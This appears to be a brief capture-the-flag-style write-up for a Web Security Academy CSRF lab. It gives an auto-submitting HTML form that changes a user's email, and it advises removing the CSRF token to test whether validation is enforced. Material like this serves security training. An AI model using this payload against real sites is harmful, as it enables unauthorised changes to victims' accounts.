# CSRF Vulnerability


![****](/CSRF/Screenshots/csrf3.PNG)


## Let generate some Payloads!

```php
<form method="POST" action="X.web-security-academy.net/my-account/change-email">
	<input type="text" name="email" value="test@gmail.com">
</form>
<script>
	document.forms[0].submit();
</script>
```

## Takeaway

- Just remove the CSRF Token field and check if you can submit the request!